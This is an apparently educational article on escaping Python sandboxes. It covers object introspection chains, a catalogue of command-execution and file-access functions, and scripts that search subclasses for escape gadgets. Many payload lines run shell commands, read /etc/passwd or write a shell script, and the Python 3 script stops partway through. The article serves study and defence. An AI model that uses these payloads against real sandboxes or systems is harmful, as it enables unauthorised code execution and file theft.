# Python safe learning—Python sandbox escape

Author: H3rmesk1t

Data: 2022.03.23

# Introduction
The so-called `Python` sandbox means that the `Python` terminal is simulated in a certain way, realizing the user's use of `Python`. And `Python` sandbox escape means that the attacker escapes from the simulated sandbox environment through some bypassing method, thereby realizing attack operations such as executing system commands.

# Pre-knowledge
## dir function
When the `dir` function does not contain parameters, it returns a list of variables, methods and definitions in the current range; when the `dir` function takes parameters, it returns a list of attributes and methods of the parameter. If the parameter contains the method `__dir__()`, the method will be called. If the parameter does not contain `__dir__()`, the method will collect parameter information to the maximum extent.

<div align=center><img src="./images/1.png"></div>

## Object class
There are many basic functions integrated in the `Python`'s Object class. When you want to call it, you also need to use `object` to operate. The main method is to create `object` through `__mro__` and `__bases__`. Then, you can get all the subclasses lists through the `__subclasses__()` method of the `object` class. However, it should be noted that the subclasses obtained by `Python2` and `Python3` are different.

<div align=center><img src="./images/2.png"></div>

<div align=center><img src="./images/3.png"></div>

# Import module
In the built-in functions of `Python`, there are some functions that can implement arbitrary command execution, for example:

```shell
os.system()
os.popen()
commands.getstatusoutput()
commands.getoutput()
commands.getstatus()
subprocess.call(command, shell=True)
subprocess.Popen(command, shell=True)
pty.spawn()
```

In `Python`, there are usually three ways to import modules:
 - import xxx
 - from xxx import *
 - __import__('xxx')

Using the above import method, import related modules and use the above functions to implement command execution. In addition, modules can also be introduced through paths. For example, in the linux system, the path of the `os` module of Python is generally in `/usr/lib/python2.7/os.py`. When you know the path, you can import the module by operating accordingly, and then further use related functions.

# Python bypass common functions and properties in sandboxes
## `__mro__`
`__mro__` is used to show the inheritance relationship of a class. Similar to `bases`, it recursively displays the parent class until `object`, and the return type is a tuple.

<div align=center><img src="./images/6.png"></div>

## `__base__`
List its base class, `__bases__` is also listed, but `__bases__` returns a tuple.

<div align=center><img src="./images/7.png"></div>

## `__name__`
Get the name of the module. This value only gets a string, not a reference to the module.

## `__call__`
Class instances can be called as functions.

## `reload()`
Reload the previously imported module.

## `getattr()`
Returns the value of the named attribute of the object, `getattr(object, name)`, which is equivalent to `object.name`, and `name` must be a string.

## `__import__`
`__import__` receives a string as a parameter and imports the module with the name of the string. For example, `import os` is equivalent to `__import__('os')`. Since the parameters are in the form of strings, in some cases, `Bypass` filtering can be used in string splicing, for example, `__import__('o'+'s').system('who'+'ami')`.

<div align=center><img src="./images/5.png"></div>

## `__globals__`
`__globals__` is a special property that can return all variables in the module namespace where the function is located, including many `modules` that have been introduced.

## `__getattr__`
Called when the property lookup is not found at the usual location, for example it is not an instance property, nor is it found in the class tree `self`.

## `__builtins__`
The built-in module of `Python`, the functions in the built-in module can be used directly without adding built-in module prefixes before it. In the `Python2.X` version, the built-in module is named `__builtin__`, and in the `Python3.X` version, it is named `__builtins__`. You can view the functions contained in the module through the `dir()` function, and these functions can also be called through the `dict` property.

<div align=center><img src="./images/4.png"></div>

## `func_globals`
Returns a reference to the dictionary containing the function global variables (global command control of the module that defines the function), `function.func_globals`, the return type is a dictionary.

## `__subclasses__`
Returns a list of subclasses.

## `__getattribute__()`
Called to unconditionally implement property access to the class instance, `object.getattribute(self, name)`, where `name` is required.

# Available modules and methods
Among the built-in functions of `Python`, there are some functions that can help implement the utilization of command execution or file operations.

## Command execution class
### os

```python
import os
# Execution of the shell command will not return the shell's output.
os.system('whoami')
# will generate a return value, and the return value can be read through read().
os.popen("whoami").read()
```

### pyt
`Linux` environment only.

```python
import pty
pty.spawn("ls")
```

### sys
This module is implemented by introducing the command execution module into the `modules` function.

```python
import sys
sys.modules['os'].system('whoami')
```

### timeit

```python
import timeit
timeit.timeit("__import__('os').system('whoami')",number=1)
```

### commands
The `commands` module will return the command output and execution status bits, only for the `Linux` environment.

```python
import commands
commands.getstatusoutput("ls")
commands.getoutput("ls")
commands.getstatus("ls")
```

### platform
Only `python2.7` applies.

```python
import platform
print(platform.popen('whoami').read())
```

### importlib
Command execution is implemented by introducing other command execution libraries.

```python
import importlib
importlib.import_module('os').system('whoami')
```

### exec/eval/execfile/compile
These functions can execute the `Python` code of parameters, and `execfile` only exists in `Python2`.

```python
exec("__import__('os').system('whoami')")

eval("__import__('os').system('whoami')")

execfile('/usr/lib/python2.7/os.py')
system('whoami')

exec(compile("__import__('os').system('whoami')", '<string>', 'exec'))
```

## File Operation Class
### file
This function only exists in `Python2`.

```python
file('/etc/passwd').read()
file('demo.txt', 'w').write('xxx')
```

### open

```python
open('/etc/passwd').read()
open('demo.txt', 'w').write('xxx')
```

### codecs

```python
import codecs
codecs.open('/etc/passwd').read()
codecs.open('demo.txt', 'w').write('xxx')
```

## Get current Python environment information

```python
import sys
sys.version
sys.path
sys.modules
```

# traversal to get escape method
## Analysis of escape method
Let’s first look at the basic escape method, that is, constructing element chains. First, get a `object` class. All `Python2` is used for demonstration in this section.

```python
''.__class__.__mro__[2]
[].__class__.__mro__[1]
{}.__class__.__mro__[1]
().__class__.__mro__[1]
[].__class__.__mro__[-1]
{}.__class__.__mro__[-1]
().__class__.__mro__[-1]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
[].__class__.__base__
().__class__.__base___
{}.__class__.__base__
```

<div align=center><img src="./images/8.png"></div>

Then, use the `__subclasses__()` method of the `object` class to get all the subclasses obtained by `Python2` and `Python3` are different.

```python
''.__class__.__mro__[2].__subclasses__()
[].__class__.__mro__[1].__subclasses__()
{}.__class__.__mro__[1].__subclasses__()
().__class__.__mro__[1].__subclasses__()
{}.__class__.__bases__[0].__subclasses__()
().__class__.__bases__[0].__subclasses__()
[].__class__.__bases__[0].__subclasses__()
```

<div align=center><img src="./images/9.png"></div>

Then look for the overloaded `__init__` class. After obtaining the initialization attribute, look for those without `wrapper`, because `wrapper` means that these functions are not overloaded. At this time, they are not `function` and do not have `__globals__` attribute.

<div align=center><img src="./images/10.png"></div>

Here you can use the `for` loop to quickly screen for qualified classes:

```python
subclassesList = ''.__class__.__mro__[2].__subclasses__()
lengthOfSubclasses = len(subclassesList)
for i in range(lengthOfSubclasses):
    if 'wrapper' not in str(subclassesList[i].__init__):
        print(i, subclassesList[i])
```

The output result is:

```python
(58, <class 'warnings.WarningMessage'>)
(59, <class 'warnings.catch_warnings'>)
(60, <class '_weakrefset._IterationGuard'>)
(61, <class '_weakrefset.WeakSet'>)
(71, <class 'site._Printer'>)
(76, <class 'site.Quitter'>)
(77, <class 'codecs.IncrementalEncoder'>)
(78, <class 'codecs.IncrementalDecoder'>)
```

<div align=center><img src="./images/11.png"></div>

Since the overloaded `__init__` class has `__globals__` attribute, many `dict` types will be returned.

```python
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__
```

<div align=center><img src="./images/12.png"></div>

Look for `__builtins__` in `keys` to view the reference, and it will also return many `dict` types.

```python
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']
```

<div align=center><img src="./images/13.png"></div>

Finally, look for available functions in `keys`, such as the `file` function.

```python
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()
```

<div align=center><img src="./images/14.png"></div>

## Script traversal other escape methods
### Python2

```python
# coding=UTF-8

find_modules = {'filecmp': ['os', '__builtins__'], 'heapq': ['__builtins__'], 'code': ['sys', '__builtins__'],
                'hotshot': ['__builtins__'], 'distutils': ['sys', '__builtins__'], 'functools': ['__builtins__'],
                'random': ['__builtins__'], 'tty': ['sys', '__builtins__'], 'subprocess': ['os', 'sys', '__builtins__'],
                'sysconfig': ['os', 'sys', '__builtins__'], 'whichdb': ['os', 'sys', '__builtins__'],
                'runpy': ['sys', '__builtins__'], 'pty': ['os', 'sys', '__builtins__'],
                'plat-atheos': ['os', 'sys', '__builtins__'], 'xml': ['__builtins__'], 'sgmllib': ['__builtins__'],
                'importlib': ['sys', '__builtins__'], 'UserList': ['__builtins__'], 'tempfile': ['__builtins__'],
                'mimify': ['sys', '__builtins__'], 'pprint': ['__builtins__'],
                'platform': ['os', 'platform', 'sys', '__builtins__'], 'collections': ['__builtins__'],
                'cProfile': ['__builtins__'], 'smtplib': ['__builtins__'], 'compiler': ['__builtins__', 'compile'],
                'string': ['__builtins__'], 'SocketServer': ['os', 'sys', '__builtins__'],
                'plat-darwin': ['os', 'sys', '__builtins__'], 'zipfile': ['os', 'sys', '__builtins__'],
                'repr': ['__builtins__'], 'wave': ['sys', '__builtins__', 'open'], 'curses': ['__builtins__'],
                'antigravity': ['__builtins__'], 'plat-irix6': ['os', 'sys', '__builtins__'],
                'plat-freebsd6': ['os', 'sys', '__builtins__'], 'plat-freebsd7': ['os', 'sys', '__builtins__'],
                'plat-freebs
d4': ['os', 'sys', '__builtins__'], 'plat-freebsd5': ['os', 'sys', '__builtins__'],
                'plat-freebsd8': ['os', 'sys', '__builtins__'], 'aifc': ['__builtins__', 'open'],
                'sndhdr': ['__builtins__'], 'cookielib': ['__builtins__'], 'ConfigParser': ['__builtins__'],
                'httplib': ['os', '__builtins__'], '_MozillaCookieJar': ['sys', '__builtins__'],
                'bisect': ['__builtins__'], 'decimal': ['__builtins__'], 'cmd': ['__builtins__'],
                'binhex': ['os', 'sys', '__builtins__'], 'sunau': ['__builtins__', 'open'],
                'pydoc': ['os', 'sys', '__builtins__'], 'plat-riscos': ['os', 'sys', '__builtins__'],
                'token': ['__builtins__'], 'Bastion': ['__builtins__'], 'msilib': ['os', 'sys', '__builtins__'],
                'shlex': ['os', 'sys', '__builtins__'], 'quopri': ['__builtins__'],
                'multiprocessing': ['os', 'sys', '__builtins__'], 'dummy_threading': ['__builtins__'],
                'dircache': ['os', '__builtins__'], 'asynccore': ['os', 'sys', '__builtins__'],
                'pkgutil': ['os', 'sys', '__builtins__'], 'compileall': ['os', 'sys', '__builtins__'],
                'SimpleHTTPServer': ['os', 'sys', '__builtins__'], 'locale': ['sys', '__builtins__'],
                'chunk': ['__builtins__'], 'macpath': ['os', '__builtins__'], 'popen2': ['os', 'sys', '__builtins__'],
                'mimetypes': ['os', 'sys', '__builtins__'], 'toaiff': ['os', '__builtins__'],
                'atexit': ['sys', '__builtins__'], 'pydoc_data': ['__builtins__'],
                'tabnanny': ['os', 'sys', '__builtins__'], 'HTMLParser': ['__builtins__'],
                'encodings': ['codecs', '__builtins__'], 'BaseHTTPServer': ['sys', '__builtins__'],
                'calendar': ['sys', '__builtins__'], 'mailcap': ['os', '__builtins__'],
                'plat-unixware7': ['os', 'sys', '__builtins__'], 'abc': ['__builtins__'], 'plistlib': ['__builtins__'],
                'bdb': ['os', 'sys', '__builtins__'], 'py_compile': ['os', 'sys', '__builtins__', 'compile'],
                'pipes': ['os', '__builtins__'], 'rfc822': ['__builtins__'],
                'tarfile': ['os', 'sys', '__builtins__', 'open'], 'struct': ['__builtins__'],
                'urllib': ['os', 'sys', '__builtins__'], 'fpformat': ['__builtins__'],
                're': ['sys', '__builtins__', 'compile'], 'mutex': ['__builtins__'],
                'ntpath': ['os', 'sys', '__builtins__'], 'UserString': ['sys', '__builtins__'], 'new': ['__builtins__'],
                'formatter': ['sys', '__builtins__'], 'email': ['sys', '__builtins__'],
                'cgi': ['os', 'sys', '__builtins__'], 'ftplib': ['os', 'sys', '__builtins__'],
                'plat-linux2': ['os', 'sys', '__builtins__'], 'ast': ['__builtins__'],
                'optparse': ['os', 'sys', '__builtins__'], 'UserDict': ['__builtins__'],
                'inspect': ['os', 'sys', '__builtins__'], 'mailbox': ['os', 'sys', '__builtins__'],
                'Queue': ['__builtins__'], 'fnmatch': ['__builtins__'], 'ctypes': ['__builtins__'],
                'codecs': ['sys', '__builtins__', 'open'], 'getopt': ['os', '__builtins__'], 'md5': ['__builtins__'],
                'cgitb': ['os', 'sys', '__builtins__'], 'commands': ['__builtins__'],
                'logging': ['os', 'codecs', 'sys', '__builtins__'], 'socket': ['os', 'sys', '__builtins__'],
                'plat-irix5': ['os', 'sys', '__builtins__'], 'sre': ['__builtins__', 'compile'],
                'ensurepip': ['os', 'sys', '__builtins__'], 'DocXMLRPCServer': ['sys', '__builtins__'],
                'traceback': ['sys', '__builtins__'], 'netrc': ['os', '__builtins__'], 'wsgiref': ['__builtins__'],
                'plat-generic': ['os', 'sys', '__builtins__'], 'weakref': ['__builtins__'],
                'ihooks': ['os', 'sys', '__builtins__'], 'telnetlib': ['sys', '__builtins__'],
                'doctest': ['os', 'sys', '__builtins__'], 'pstats': ['os',
'sys', '__builtins__'],
                'smtpd': ['os', 'sys', '__builtins__'], '_pyio': ['os', 'codecs', 'sys', '__builtins__', 'open'],
                'dis': ['sys', '__builtins__'], 'os': ['sys', '__builtins__', 'open'],
                'pdb': ['os', 'sys', '__builtins__'], 'this': ['__builtins__'], 'base64': ['__builtins__'],
                'os2emxpath': ['os', '__builtins__'], 'glob': ['os', 'sys', '__builtins__'],
                'unittest': ['__builtins__'], 'dummy_thread': ['__builtins__'],
                'fileinput': ['os', 'sys', '__builtins__'], '__future__': ['__builtins__'],
                'robotparser': ['__builtins__'], 'plat-mac': ['os', 'sys', '__builtins__'],
                '_threading_local': ['__builtins__'], '_LWPCookieJar': ['sys', '__builtins__'],
                'wsgiref.egg-info': ['os', 'sys', '__builtins__'], 'sha': ['__builtins__'],
                'sre_constants': ['__builtins__'], 'json': ['__builtins__'], 'Cookie': ['__builtins__'],
                'tokenize': ['__builtins__'], 'plat-beos5': ['os', 'sys', '__builtins__'],
                'rexec': ['os', 'sys', '__builtins__'], 'lib-tk': ['__builtins__'], 'textwrap': ['__builtins__'],
                'fractions': ['__builtins__'], 'sqlite3': ['__builtins__'], 'posixfile': ['__builtins__', 'open'],
                'imaplib': ['subprocess', 'sys', '__builtins__'], 'xdrlib': ['__builtins__'],
                'imghdr': ['__builtins__'], 'macurl2path': ['os', '__builtins__'],
                '_osx_support': ['os', 'sys', '__builtins__'],
                'webbrowser': ['os', 'subprocess', 'sys', '__builtins__', 'open'],
                'plat-netbsd1': ['os', 'sys', '__builtins__'], 'nurl2path': ['__builtins__'],
                'tkinter': ['__builtins__'], 'copy': ['__builtins__'], 'pickletools': ['__builtins__'],
                'hashlib': ['__builtins__'], 'anydbm': ['__builtins__', 'open'], 'keyword': ['__builtins__'],
                'timeit': ['timeit', 'sys', '__builtins__'], 'uu': ['os', 'sys', '__builtins__'],
                'StringIO': ['__builtins__'], 'modulefinder': ['os', 'sys', '__builtins__'],
                'stringprep': ['__builtins__'], 'markupbase': ['__builtins__'], 'colorsys': ['__builtins__'],
                'shelve': ['__builtins__', 'open'], 'multifile': ['__builtins__'], 'sre_parse': ['sys', '__builtins__'],
                'pickle': ['sys', '__builtins__'], 'plat-os2emx': ['os', 'sys', '__builtins__'],
                'mimetools': ['os', 'sys', '__builtins__'], 'audiodev': ['__builtins__'], 'copy_reg': ['__builtins__'],
                'sre_compile': ['sys', '__builtins__', 'compile'], 'CGIHTTPServer': ['os', 'sys', '__builtins__'],
                'idlelib': ['__builtins__'], 'site': ['os', 'sys', '__builtins__'],
                'getpass': ['os', 'sys', '__builtins__'], 'imputil': ['sys', '__builtins__'],
                'bsddb': ['os', 'sys', '__builtins__'], 'contextlib': ['sys', '__builtins__'],
                'numbers': ['__builtins__'], 'io': ['__builtins__', 'open'],
                'plat-sunos5': ['os', 'sys', '__builtins__'], 'symtable': ['__builtins__'],
                'pyclbr': ['sys', '__builtins__'], 'shutil': ['os', 'sys', '__builtins__'], 'lib2to3': ['__builtins__'],
                'threading': ['__builtins__'], 'dbhash': ['sys', '__builtins__', 'open'],
                'gettext': ['os', 'sys', '__builtins__'], 'dumbdbm': ['__builtins__', 'open'],
                '_weakrefset': ['__builtins__'], '_abcoll': ['sys', '__builtins__'], 'MimeWriter': ['__builtins__'],
                'test': ['__builtins__'], 'opcode': ['__builtins__'], 'csv': ['__builtins__'],
                'nntplib': ['__builtins__'], 'profile': ['os', 'sys', '__builtins__'],
                'genericpath': ['os', '__builtins__'], 'stat': ['__builtins__'], '__phello__.foo': ['__builtins__'],
                'sched': ['__builtins__'], 'statvfs': ['__builtins__'], 'trace': ['os', 'sys', '__builtins__'],
                'warnings': ['sys',
'__builtins__'], 'symbol': ['__builtins__'], 'sets': ['__builtins__'],
                'htmlentitydefs': ['__builtins__'], 'urllib2': ['os', 'sys', '__builtins__'],
                'SimpleXMLRPCServer': ['os', 'sys', '__builtins__'], 'sunaudio': ['__builtins__'],
                'pdb.doc': ['os', '__builtins__'], 'asynchat': ['__builtins__'], 'user': ['os', '__builtins__'],
                'xmllib': ['__builtins__'], 'codeop': ['__builtins__'], 'plat-next3': ['os', 'sys', '__builtins__'],
                'types': ['__builtins__'], 'argparse': ['__builtins__'], 'uuid': ['os', 'sys', '__builtins__'],
                'plat-aix4': ['os', 'sys', '__builtins__'], 'plat-aix3': ['os', 'sys', '__builtins__'],
                'ssl': ['os', 'sys', '__builtins__'], 'poplib': ['__builtins__'], 'xmlrpclib': ['__builtins__'],
                'difflib': ['__builtins__'], 'urlparse': ['__builtins__'], 'linecache': ['os', 'sys', '__builtins__'],
                '_strptime': ['__builtins__'], 'htmllib': ['__builtins__'], 'site-packages': ['__builtins__'],
                'posixpath': ['os', 'sys', '__builtins__'], 'stringold': ['__builtins__'],
                'gzip': ['os', 'sys', '__builtins__', 'open'], 'mhlib': ['os', 'sys', '__builtins__'],
                'rlcompleteter': ['__builtins__'], 'hmac': ['__builtins__']}
target_modules = ['os', 'platform', 'subprocess', 'timeit', 'importlib', 'codecs', 'sys']
target_functions = ['__import__', '__builtins__', 'exec', 'eval', 'execfile', 'compile', 'file', 'open']
all_targets = list(set(find_modules.keys() + target_modules + target_functions))
all_modules = list(set(find_modules.keys() + target_modules))
subclasses = ().__class__.__bases__[0].__subclasses__()
sub_name = [s.__name__ for s in subclasses]
# The first traversal, such as:().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()
print('----------1-----------')
for i, s in enumerate(sub_name):
    for f in all_targets:
        if f == s:
            if f in target_functions:
                print(i, f)
            elif f in all_modules:
                target = find_modules[f]
                sub_dict = subclasses[i].__dict__
                for t in target:
                    if t in sub_dict:
                        print(i, f, target)
print('----------2-----------')
# The second type of traversal, such as:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')
for i, sub in enumerate(subclasses):
    try:
        more = sub.__init__.func_globals
        for m in all_targets:
            if m in more:
                print(i, sub, m, find_modules.get(m))
    except Exception as e:
        pass
print('----------3-----------')
# The third type of traversal, such as:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").system("ls")')
for i, sub in enumerate(subclasses):
    try:
        more = sub.__init__.func_globals.values()
        for j, v in enumerate(more):
            for f in all_targets:
                try:
                    if f in v:
                        if f in target_functions:
                            print(i, j, sub, f)
                        elif f in all_modules:
                            target = find_modules.get(f)
                            sub_dict = v[f].__dict__
                            for t in target:
                                if t in sub_dict:
                                    print(i, j, sub, f, target)
                except Exception as e:
                    pass
    except Exception as e:
        pass
print('----------4-----------')
# The fourth type of traversal: such as:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']("os").system("ls")
# <class 'warnings.catch_warnings'> class is very special. _module=sys.modules['warnings'] is defined internally. Then the warnings module contains __builtins__, which is not universal, and is essentially similar to the first method.
for i, sub in enumerate(subclasses):
    try:
        more = sub()._module.__builtins__
        for f in all_targets:
            if f in more:
                print(
i, f)
    except Exception as e:
        pass
```

 - The first method `Payload`:

```python
''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
''.__class__.__mro__[2].__subclasses__()[40]('/tmp/shell.sh', 'w').write('/bin/bash xxxx')
```

 - The second method `Payload`:

```python
# linecache utilization
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('whoami')
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['sys'].modules['os'].system('whoami')
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['__builtins__']['__import__']('os').system('whoami')

# __builtins__utilization, including __import__, file, open, execfile, eval, compile combined with exec, etc.
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('whoami')
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('E:/passwd').read()
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['open']('E:/test.txt', 'w').write('hello')
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['execfile']('E:/exp.py')
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").system("whoami")')
exec(''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['compile']('__import__("os").system("whoami")', '<string>', 'exec'))

# sys utilization
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].system('whoami')

# types utilization, and later it is still used through __builtins__
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['types'].__dict__['__builtins__']['__import__']('os').system('whoami')

#os Utilization
''.__class__.__mro__[2].__subclasses__()[72].__init__.__globals__['os'].system('whoami')

# open utilization
''.__class__.__mro__[2].__subclasses__()[78].__init__.__globals__['open']('/etc/passwd').read()
''.__class__.__mro__[2].__subclasses__()[78].__init__.__globals__['open']('/tmp/shell.sh', 'w').write('/bin/bash xxxx')
```

 - The third method `Payload`:

```python
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.values()[13]['eval']('__import__("os").system("whoami")')
# ...The others are similar to the ones above.
```

 - The fourth method `Payload`:

```python
''.__class__.__mro__[2].__subclasses__()[60]()._module.__builtins__['__import__']("os").system("whoami")
```

## Python3

```python
# coding=utf-8

find_modules = {'asyncio': ['subprocess', 'sys', '__builtins__'], 'collections': ['__builtins__'],
                'concurrent': ['__builtins__'], 'ctypes': ['__builtins__'], 'curses': ['__builtins__'],
                'dbm': ['os', 'sys', '__builtins__', 'open'], 'distutils': ['sys', '__builtins__'],
                'email': ['__builtins__'], 'encodings': ['codecs', 'sys', '__builtins__'],
                'ensurepip': ['os', 'sys', '__builtins__'], 'html': ['__builtins__'], 'http': ['__builtins__'],
                'idlelib': ['__builtins__'], 'importlib': ['sys', '__import__', '__builtins__'],
                'json': ['codecs', '__builtins__'], 'lib2to3': ['__builtins__'],
                'logging': ['os', 'sys', '__builtins__'], 'msilib': ['os', 'sys', '__builtins__'],
                'multiprocessing': ['sys', '__builtins__'], 'pydoc_data': ['__builtins__'], 'sqlite3': ['__builtins__'],
                'test': ['__builtins__'], 'tkinter': ['sys', '__builtins__'], 'turtledemo': ['__builtins__'],
                'unittest': ['__builtins__'], 'urllib': ['__builtins__'],
                'venv': ['os', 'subprocess', 'sys', '__builtins__'], 'wsgiref': ['__builtins__'],
                'xml': ['__builtins__'], 'xmlrpc': ['__builtins__'], '__future__': ['__builtins__'],
                '__phello__.foo': ['__builtins__'], '_bootlocale': ['sys', '__builtins__'],
                '_collections_abc': ['sys', '__builtins__'], '_compat_pickle': ['__builtins__'],
                '_compression': ['__builtins__'], '_dummy_thread': ['__bui
ltins__'], '_markupbase': ['__builtins__'],
                '_osx_support': ['os', 'sys', '__builtins__'], '_pydecimal': ['__builtins__'],
                '_pyio': ['os', 'codecs', 'sys', '__builtins__', 'open'], '_sitebuiltins': ['sys', '__builtins__'],
                '_strptime': ['__builtins__'], '_threading_local': ['__builtins__'], '_weakrefset': ['__builtins__'],
                'abc': ['__builtins__'], 'aifc': ['__builtins__', 'open'], 'antigravity': ['__builtins__'],
                'argparse': ['__builtins__'], 'ast': ['__builtins__'], 'asynchat': ['__builtins__'],
                'asynccore': ['os', 'sys', '__builtins__'], 'base64': ['__builtins__'],
                'bdb': ['os', 'sys', '__builtins__'], 'binhex': ['os', '__builtins__'], 'bisect': ['__builtins__'],
                'bz2': ['os', '__builtins__', 'open'], 'cProfile': ['__builtins__'],
                'calendar': ['sys', '__builtins__'], 'cgi': ['os', 'sys', '__builtins__'],
                'cgitb': ['os', 'sys', '__builtins__'], 'chunk': ['__builtins__'], 'cmd': ['sys', '__builtins__'],
                'code': ['sys', '__builtins__'], 'codecs': ['sys', '__builtins__', 'open'], 'codeop': ['__builtins__'],
                'colorsys': ['__builtins__'], 'compileall': ['os', 'importlib', 'sys', '__builtins__'],
                'configparser': ['os', 'sys', '__builtins__'], 'contextlib': ['sys', '__builtins__'],
                'copy': ['__builtins__'], 'copyreg': ['__builtins__'], 'crypt': ['__builtins__'],
                'csv': ['__builtins__'], 'datetime': ['__builtins__'], 'decimal': ['__builtins__'],
                'difflib': ['__builtins__'], 'dis': ['sys', '__builtins__'], 'doctest': ['os', 'sys', '__builtins__'],
                'dummy_threading': ['__builtins__'], 'enum': ['sys', '__builtins__'], 'filecmp': ['os', '__builtins__'],
                'fileinput': ['os', 'sys', '__builtins__'], 'fnmatch': ['os', '__builtins__'],
                'formatter': ['sys', '__builtins__'], 'fractions': ['sys', '__builtins__'],
                'ftplib': ['sys', '__builtins__'], 'functools': ['__builtins__'], 'genericpath': ['os', '__builtins__'],
                'getopt': ['os', '__builtins__'], 'getpass': ['os', 'sys', '__builtins__'],
                'gettext': ['os', 'sys', '__builtins__'], 'glob': ['os', '__builtins__'],
                'gzip': ['os', 'sys', '__builtins__', 'open'], 'hashlib': ['__builtins__'], 'heapq': ['__builtins__'],
                'hmac': ['__builtins__'], 'imaplib': ['subprocess', 'sys', '__builtins__'], 'imghdr': ['__builtins__'],
                'imp': ['os', 'importlib', 'sys', '__builtins__'],
                'inspect': ['os', 'importlib', 'sys', '__builtins__'], 'io': ['__builtins__', 'open'],
                'ipaddress': ['__builtins__'], 'keyword': ['__builtins__'], 'linecache': ['os', 'sys', '__builtins__'],
                'locale': ['sys', '__builtins__'], 'lzma': ['os', '__builtins__', 'open'],
                'macpath': ['os', '__builtins__'], 'macurl2path': ['os', '__builtins__'],
                'mailbox': ['os', '__builtins__'], 'mailcap': ['os', '__builtins__'],
                'mimetypes': ['os', 'sys', '__builtins__'], 'modulefinder': ['os', 'importlib', 'sys', '__builtins__'],
                'netrc': ['os', '__builtins__'], 'nntplib': ['__builtins__'], 'ntpath': ['os', 'sys', '__builtins__'],
                'nurl2path': ['__builtins__'], 'numbers': ['__builtins__'], 'opcode': ['__builtins__'],
                'operator': ['__builtins__'], 'optparse': ['os', 'sys', '__builtins__'],
                'os': ['sys', '__builtins__', 'open'], 'pathlib': ['os', 'sys', '__builtins__'],
                'pdb': ['os', 'sys', '__builtins__'], 'pickle': ['codecs', 'sys', '__builtins__'],
                'pickletools': ['codecs', 'sys', '__builtins__'], 'pipes': ['os', '__builtins__'],
                'pkgutil': ['os', 'importlib', 'sys', '__builtins__'],
                'platform': ['os', 'platform', 'subprocess', 'sys', '__buil
tins__'],
                'plistlib': ['os', 'codecs', '__builtins__'], 'poplib': ['__builtins__'],
                'posixpath': ['os', 'sys', '__builtins__'], 'pprint': ['__builtins__'],
                'profile': ['os', 'sys', '__builtins__'], 'pstats': ['os', 'sys', '__builtins__'],
                'pty': ['os', 'sys', '__builtins__'],
                'py_compile': ['os', 'importlib', 'sys', '__builtins__', 'compile'],
                'pyclbr': ['importlib', 'sys', '__builtins__'],
                'pydoc': ['os', 'platform', 'importlib', 'sys', '__builtins__'], 'queue': ['__builtins__'],
                'quopri': ['__builtins__'], 'random': ['__builtins__'], 're': ['__builtins__', 'compile'],
                'reprlib': ['__builtins__'], 'rlcompleteter': ['__builtins__'],
                'runpy': ['importlib', 'sys', '__builtins__'], 'sched': ['__builtins__'],
                'secrets': ['os', '__builtins__'], 'selectors': ['sys', '__builtins__'],
                'shelve': ['__builtins__', 'open'], 'shlex': ['os', 'sys', '__builtins__'],
                'shutil': ['os', 'sys', '__builtins__'], 'signal': ['__builtins__'],
                'site': ['os', 'sys', '__builtins__'], 'smtpd': ['os', 'sys', '__builtins__'],
                'smtplib': ['sys', '__builtins__'], 'sndhdr': ['__builtins__'], 'socket': ['os', 'sys', '__builtins__'],
                'socketserver': ['os', 'sys', '__builtins__'], 'sre_compile': ['__builtins__', 'compile'],
                'sre_constants': ['__builtins__'], 'sre_parse': ['__builtins__'], 'ssl': ['os', 'sys', '__builtins__'],
                'stat': ['__builtins__'], 'statistics': ['__builtins__'], 'string': ['__builtins__'],
                'stringprep': ['__builtins__'], 'struct': ['__builtins__'], 'subprocess': ['os', 'sys', '__builtins__'],
                'sunau': ['__builtins__', 'open'], 'symbol': ['__builtins__'], 'symtable': ['__builtins__'],
                'sysconfig': ['os', 'sys', '__builtins__'], 'tabnanny': ['os', 'sys', '__builtins__'],
                'tarfile': ['os', 'sys', '__builtins__', 'open'], 'telnetlib': ['sys', '__builtins__'],
                'tempfile': ['__builtins__'], 'textwrap': ['__builtins__'], 'this': ['__builtins__'],
                'threading': ['__builtins__'], 'timeit': ['timeit', 'sys', '__builtins__'], 'token': ['__builtins__'],
                'tokenize': ['sys', '__builtins__', 'open'], 'trace': ['os', 'sys', '__builtins__'],
                'traceback': ['sys', '__builtins__'], 'tracemalloc': ['os', '__builtins__'],
                'tty': ['os', '__builtins__'], 'turtle': ['sys', '__builtins__'], 'types': ['__builtins__'],
                'typing': ['sys', '__builtins__'], 'uu': ['os', 'sys', '__builtins__'],
                'uuid': ['os', 'sys', '__builtins__'], 'warnings': ['sys', '__builtins__'],
                'wave': ['sys', '__builtins__', 'open'], 'weakref': ['sys', '__builtins__'],
                'webbrowser': ['os', 'subprocess', 'sys', '__builtins__', 'open'], 'xdrlib': ['__builtins__'],
                'zipapp': ['os', 'sys', '__builtins__'], 'zipfile': ['os', 'importlib', 'sys', '__builtins__']}
target_modules = ['os', 'platform', 'subprocess', 'timeit', 'importlib', 'codecs', 'sys']
